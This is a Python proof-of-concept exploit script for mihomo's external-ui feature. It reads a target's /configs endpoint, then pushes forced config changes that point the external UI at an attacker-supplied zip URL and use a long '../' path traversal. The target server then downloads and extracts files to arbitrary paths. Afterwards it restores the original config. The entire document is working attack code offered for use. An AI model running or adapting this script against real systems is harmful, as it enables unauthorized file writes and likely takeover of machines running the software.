import requests
import json
import argparse


def exploit(url: str, zips: list[tuple[str, str]]):
    resp = requests.get(f"{url}/configs", timeout=10)
    resp.raise_for_status()
    config = resp.json()
    for path, zip_url in zips:
        print(f"Trying to extract to {path}")
        new_config = {
            **config,
            "external-ui": "./",
            "external-ui-url": zip_url,
            "external-ui-name": "/".join(".." for _ in range(20)) + path,
        }
        resp = requests.put(
            f"{url}/configs",
            params={"force": "true"},
            json={"payload": json.dumps(new_config), "path": ""},
            timeout=10,
        )
    resp = requests.put(
        f"{url}/configs",
        params={"force": "true"},
        json={"payload": json.dumps(config), "path": ""},
        timeout=10,
    )


def main():

    parser = argparse.ArgumentParser(
        description="Exploit mihomo external-ui any file write via zip extraction"
    )
    parser.add_argument("url", help="Target base URL")
    parser.add_argument(
        "zips",
        nargs="+",
        help="Pairs of <path>:<zip_url>, e.g. /tmp/abc:http://url/to/abc.zip",
    )
    args = parser.parse_args()

    zips = []
    for item in args.zips:
        if ":" not in item:
            print(f"Invalid zips argument: {item}")
            continue
        path, zip_url = item.split(":", 1)
        zips.append((path, zip_url))

    exploit(args.url, zips)


if __name__ == "__main__":
    main()
